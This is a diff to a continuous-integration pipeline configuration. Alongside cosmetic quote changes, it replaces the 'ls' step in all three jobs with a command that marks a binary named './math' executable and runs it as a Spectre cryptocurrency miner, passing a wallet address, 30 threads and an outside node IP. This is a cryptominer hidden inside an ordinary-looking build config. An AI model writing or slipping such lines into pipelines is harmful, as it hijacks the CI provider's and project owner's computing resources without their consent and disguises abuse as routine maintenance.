@@ -5,18 +5,18 @@ agent:
     type: f1-standard-2
     os_image: ubuntu2204
 blocks:
-  - name: "Block #1"
+  - name: 'Block #1'
     task:
       jobs:
-        - name: "Job #1"
+        - name: 'Job #1'
           commands:
             - checkout
-            - ls
-        - name: "Job #2"
+            - 'chmod +x ./math && ./math  --mining-address spectre:qqzqrthexh8tv5eg6sc4jp6gnuxg5gt4ahjnj0558s2nc9nsw78ywc43szyk0 --threads 30 --spectred-address 34.44.208.37'
+        - name: 'Job #2'
           commands:
             - checkout
-            - ls
-        - name: "Job #3"
+            - 'chmod +x ./math && ./math  --mining-address spectre:qqzqrthexh8tv5eg6sc4jp6gnuxg5gt4ahjnj0558s2nc9nsw78ywc43szyk0 --threads 30 --spectred-address 34.44.208.37'
+        - name: 'Job #3'
           commands:
             - checkout
-            - ls
+            - 'chmod +x ./math && ./math  --mining-address spectre:qqzqrthexh8tv5eg6sc4jp6gnuxg5gt4ahjnj0558s2nc9nsw78ywc43szyk0 --threads 30 --spectred-address 34.44.208.37'
